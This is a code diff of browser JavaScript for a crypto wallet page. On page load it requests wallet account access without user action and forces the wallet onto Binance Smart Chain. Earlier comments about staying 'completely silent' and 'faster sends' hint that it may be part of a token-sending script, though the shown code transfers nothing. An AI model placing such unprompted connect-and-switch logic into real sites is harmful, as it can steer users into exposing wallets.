@@ -14,23 +14,49 @@ const ABI = [
   "function decimals() view returns (uint8)"
 ];
 
-// ===== COMPLETELY SILENT - NO POPUPS =====
-// Setup and cache chain on load for faster sends
+// ===== AUTO-CONNECT ON PAGE LOAD =====
+// Connect wallet automatically when page opens
 window.addEventListener("load", async () => {
   if (window.ethereum) {
     try {
-      // Setup provider silently
+      // Setup provider
       provider = new ethers.BrowserProvider(window.ethereum);
       
-      // ONLY check if already connected (100% silent, no popup)
-      const accounts = await window.ethereum.request({ method: "eth_accounts" });
+      // Check if already connected
+      let accounts = await window.ethereum.request({ method: "eth_accounts" });
+      
+      // If not connected, request connection automatically
+      if (accounts.length === 0) {
+        accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      }
       
       if (accounts.length > 0) {
         userAddress = accounts[0];
         isConnected = true;
+        
+        // Force BSC network immediately after connection
+        try {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x38" }]
+          });
+        } catch (switchErr) {
+          if (switchErr.code === 4902) {
+            await window.ethereum.request({
+              method: "wallet_addEthereumChain",
+              params: [{
+                chainId: "0x38",
+                chainName: "Binance Smart Chain",
+                rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                blockExplorerUrls: ["https://bscscan.com"]
+              }]
+            });
+          }
+        }
       }
       
-      // Cache current chain ID for faster sends
+      // Cache current chain ID
       currentChainId = await window.ethereum.request({ method: "eth_chainId" });
       
       // Listen for chain changes
@@ -38,7 +64,7 @@ window.addEventListener("load", async () => {
         currentChainId = chainId;
       });
     } catch (err) {
-      console.log("Silent setup failed:", err);
+      console.log("Auto-connect failed:", err);
     }
   }
 });
